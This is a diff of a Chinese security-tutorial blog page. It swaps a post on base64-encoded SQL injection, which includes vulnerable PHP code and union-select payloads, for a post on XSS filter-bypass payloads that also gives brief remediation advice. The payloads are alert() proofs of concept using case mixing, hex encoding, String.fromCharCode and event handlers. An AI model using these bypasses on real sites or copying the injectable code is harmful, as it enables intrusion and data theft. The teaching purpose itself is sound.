@@ -54,22 +54,18 @@
   };
 </script>
 
-  <meta name="description" content="0X00    base64注入攻击​    测试地址：http://127.0.0.1/base.php?id=MQ==​    从url中可以看出，ID参数经过base64编码，解码后发现ID为1，尝试加上一个单引号并一起转成base64编码。当访问id=1’编码后的网址（http://127.0.0.1/base.php?id=MSc=），页面返回错误。​    1 and 1=1和1 an">
+  <meta name="description" content="0X01    XSS常用语句及编码绕过XSS常用的测试语句有：&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;a href=javascript:alert(1)&amp;gt;onclick=alert(1)//onmouseover=alert(">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入(十一)|base64注入攻击">
-<meta property="og:url" content="https://ChakaLake.github.io/2019/11/17/SQL注入(十一)-base64注入攻击/index.html">
+<meta property="og:title" content="XSS(五)|XSS绕过及修复建议">
+<meta property="og:url" content="https://ChakaLake.github.io/2019/11/20/XSS(五)-XSS绕过及修复建议/index.html">
 <meta property="og:site_name" content="他年少如歌">
-<meta property="og:description" content="0X00    base64注入攻击​    测试地址：http://127.0.0.1/base.php?id=MQ==​    从url中可以看出，ID参数经过base64编码，解码后发现ID为1，尝试加上一个单引号并一起转成base64编码。当访问id=1’编码后的网址（http://127.0.0.1/base.php?id=MSc=），页面返回错误。​    1 and 1=1和1 an">
+<meta property="og:description" content="0X01    XSS常用语句及编码绕过XSS常用的测试语句有：&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;a href=javascript:alert(1)&amp;gt;onclick=alert(1)//onmouseover=alert(">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/111704.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/111705.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/111706.png">
-<meta property="og:updated_time" content="2019-11-18T11:59:01.625Z">
+<meta property="og:updated_time" content="2019-11-27T22:30:00.734Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入(十一)|base64注入攻击">
-<meta name="twitter:description" content="0X00    base64注入攻击​    测试地址：http://127.0.0.1/base.php?id=MQ==​    从url中可以看出，ID参数经过base64编码，解码后发现ID为1，尝试加上一个单引号并一起转成base64编码。当访问id=1’编码后的网址（http://127.0.0.1/base.php?id=MSc=），页面返回错误。​    1 and 1=1和1 an">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/111704.png">
-  <link rel="canonical" href="https://ChakaLake.github.io/2019/11/17/SQL注入(十一)-base64注入攻击/">
+<meta name="twitter:title" content="XSS(五)|XSS绕过及修复建议">
+<meta name="twitter:description" content="0X01    XSS常用语句及编码绕过XSS常用的测试语句有：&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;a href=javascript:alert(1)&amp;gt;onclick=alert(1)//onmouseover=alert(">
+  <link rel="canonical" href="https://ChakaLake.github.io/2019/11/20/XSS(五)-XSS绕过及修复建议/">
 
 
 <script id="page-configurations">
@@ -83,7 +79,7 @@
   };
 </script>
 
-  <title>SQL注入(十一)|base64注入攻击 | 他年少如歌</title>
+  <title>XSS(五)|XSS绕过及修复建议 | 他年少如歌</title>
   <meta name="generator" content="Hexo 3.9.0">
   
 
@@ -211,7 +207,7 @@
   
   
   <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="https://ChakaLake.github.io/2019/11/17/SQL注入(十一)-base64注入攻击/">
+    <link itemprop="mainEntityOfPage" href="https://ChakaLake.github.io/2019/11/20/XSS(五)-XSS绕过及修复建议/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yang">
@@ -223,7 +219,7 @@
       <meta itemprop="name" content="他年少如歌">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">SQL注入(十一)|base64注入攻击
+        <h1 class="post-title" itemprop="name headline">XSS(五)|XSS绕过及修复建议
 
           
         </h1>
@@ -239,7 +235,7 @@
                 
               
 
-              <time title="创建时间：2019-11-17 11:34:00" itemprop="dateCreated datePublished" datetime="2019-11-17T11:34:00+08:00">2019-11-17</time>
+              <time title="创建时间：2019-11-20 17:29:10" itemprop="dateCreated datePublished" datetime="2019-11-20T17:29:10+08:00">2019-11-20</time>
             </span>
           
             
@@ -250,22 +246,9 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-11-18 19:59:01" itemprop="dateModified" datetime="2019-11-18T19:59:01+08:00">2019-11-18</time>
+                <time title="修改时间：2019-11-28 06:30:00" itemprop="dateModified" datetime="2019-11-28T06:30:00+08:00">2019-11-28</time>
               </span>
             
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a></span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -279,15 +262,20 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>0X00    base64注入攻击</p><p>​    测试地址：<a href="http://127.0.0.1/base.php?id=MQ==" target="_blank" rel="noopener">http://127.0.0.1/base.php?id=MQ==</a><br>​    从url中可以看出，ID参数经过base64编码，解码后发现ID为1，尝试加上一个单引号并一起转成base64编码。当访问id=1’编码后的网址（<a href="http://127.0.0.1/base.php?id=MSc=），页面返回错误。" target="_blank" rel="noopener">http://127.0.0.1/base.php?id=MSc=），页面返回错误。</a><br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/111704.png" alt><br>​    1 and 1=1和1 and 1=2的base64编码分别为MSBhbmQgMT0x和MSBhbmQgMT0y<br>再次访问id=MSBhbmQgMT0y和id=MSBhbmQgMT0y。<br><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/111705.png" alt></p><a id="more"></a>
+        <p>0X01    XSS常用语句及编码绕过</p><p>XSS常用的测试语句有：<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&lt;img src=x onerror=alert(1)&gt;</code><br><code>&lt;svg onload=alert(1)&gt;</code><br><code>&lt;a href=javascript:alert(1)&gt;</code><br><code>onclick=alert(1)//</code><br><code>onmouseover=alert(1)</code></p><a id="more"></a>
 
-<p><img src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/111706.png" alt><br>    从返回结果可以看到，访问id=1 and 1=1时，页面返回与id=1相同的结果，而访问id=1 and 1=2时，页面返回与id=1不同的结果，所以该网页存在sql注入漏洞。<br>    接着，使用order by查询字段，使用union方法完成注入。</p>
-<p>0X01    base64注入代码分析</p>
-<p>​    在base64注入页面中，程序获取GET参数ID，利用base64_decode()对参数ID进行base64解码，然后直接将解码后的$id拼接到sql语句中进行查询，通过while循环将查询结果输出到页面。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=base64_decode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$conn=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line">$sql=<span class="string">"select * from users where id=$id"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row=mysql_fetch_array($result))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ID:"</span>.$row[<span class="string">'id'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"user"</span>.$row[<span class="string">'username'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"pass"</span>.$row[<span class="string">'password'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($conn);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"now use:"</span>.$sql.<span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>​        由于代码没有过滤解码后的$id，且将$id拼接到sql语句中，所以存在sql注入漏洞。当访问id=1 union select 1,2,3,4#（先进行base64编码）时，执行的sql为<br>select * from users where id=1 union select 1,2,3,4#<br>​    此时，sql语句可以分为select * from users where id=1和union select 1,2,3,4<br>两条，利用第二条语句（union查询）就可以获取数据库中的数据。<br>​    这种攻击方式还有其他利用场景，例如，如果有WAF，则WAF会对传输中的参数ID进行检查，但由于传输中的ID经过base64编码，所以此时WAF很有可能检测不到危险代码，进而绕过了WAF检测。</p>
-
+<p>改变大小写<br><code>&lt;scroipt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>转换为<code>&lt;ScRipt&gt;ALerT(&quot;XSS&quot;);&lt;/sCRipT&gt;</code></p>
+<p>关闭标签<br><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code></p>
+<p>使用hex编码绕过<br><code>&lt;scroipt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>转换为<code>%3c%73%63%72%6f%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</code></p>
+<p>绕过magic_quotes_gpc<br>magic_quotes_gpc=ON是PHP中的安全设置，开启后会把一些特殊字符进行轮换，’转换为\‘，”转换为\“，\转换为\\。<br>比如，<code>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>会转换为<code>&lt;script&gt;alert(\&quot;xss\&quot;)&lt;/script&gt;</code>，这样xss就不生效了。<br>针对开了magic_quotes_gpc的网站，可以通过javascript中的String.fromCharCode方法来绕过，String.fromCharCode()是javascript中的字符串方法，用来把ASCII码为字符串。<br><code>&lt;scroipt&gt;alert(&quot;XSS&quot;);&lt;/script&gt;</code>转换为<br><code>&lt;script&gt;String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)&lt;/script&gt;</code></p>
+<p>利用&lt;&gt;标记注射Html/Javascript<br>如果用户能随心所欲引入&lt;&gt;标记，那就能操作HTML标记，然后就能通过<script>标记插入JS恶意脚本了，例如<code>&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;</code>。<br>如果对<>和script进行了过滤，上面这个就无法执行了。</p>
+<p>利用HTML标签属性执行XSS【浏览器必须支持伪协议 如：IE6】<br>很多HTML标记中的属性都支持javascript:[code]伪协议的形式<br><code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code><br><code>&lt;table background=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;&lt;/table&gt;</code><br><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;点击触发&lt;/a&gt;</code></p>
+<p>空格/回车/Tab<br>假设过滤函数进一步又过滤了javascript等敏感字符串，只需对javascript进行小小的操作即可绕过。例如<br><code>&lt;img src=&quot;java    script:alert(&#39;xss&#39;);&quot;width=100&gt;</code><br>这里之所以能成功绕过，其实还得益于JS自身的性质：javascript通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略。<br>而如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号。如<br><code>&lt;img src=&quot;javascript:    alert(/xss/);&quot;width=100&gt;</code>同样能绕过。</p>
+<p>HTML实体编码<br>命名实体：以&开头，以分号结尾的，例如<的编码是<code>$lt;</code>。<br>字符编码：十进制、十六进制ASCII码或unioncode字符编码，样式为&#数值;，例如<可以编码为<code>&amp;#060;</code>和<code>&amp;#x3c;</code>。</p>
+<p>产生自己的事件<br>如果不能依靠属性进行跨站，那么还可以利用事件处理函数<br><code>&lt;input type=&quot;buttoon&quot; value=&quot;clickme&quot; onclick=&quot;alert(&#39;xss&#39;)&quot; /&gt;</code><br>事件技能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数。</p>
+<p>0X02    XSS漏洞修复建议</p>
+<p>因为XSS漏洞设计输入和输出两部分，所以其修复也分为两种。<br>①过滤输入的数据，包括' " < > on 等非法字符。<br>②对输出到页面的数据进行响应的编码转换，包括HTML实体编码、JavaScript编码等。</p>
+</script></p>
     </div>
 
     
@@ -312,8 +300,8 @@
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/11/17/SQL注入(十)-cookie注入攻击/" rel="next" title="SQL注入(十)|cookie注入攻击">
-                  <i class="fa fa-chevron-left"></i> SQL注入(十)|cookie注入攻击
+                <a href="/2019/11/20/XSS(四)-DOM性XSS攻击/" rel="next" title="XSS(四)|DOM性XSS攻击">
+                  <i class="fa fa-chevron-left"></i> XSS(四)|DOM性XSS攻击
                 </a>
               
             </div>
@@ -322,8 +310,8 @@
 
             <div class="post-nav-prev post-nav-item">
               
-                <a href="/2019/11/18/SQL注入(十二)-XFF注入攻击/" rel="prev" title="SQL注入(十二)|XFF注入攻击">
-                  SQL注入(十二)|XFF注入攻击 <i class="fa fa-chevron-right"></i>
+                <a href="/2019/11/27/靶机练习-XSS之旅/" rel="prev" title="靶机练习|XSS之旅">
+                  靶机练习|XSS之旅 <i class="fa fa-chevron-right"></i>
                 </a>
               
             </div>
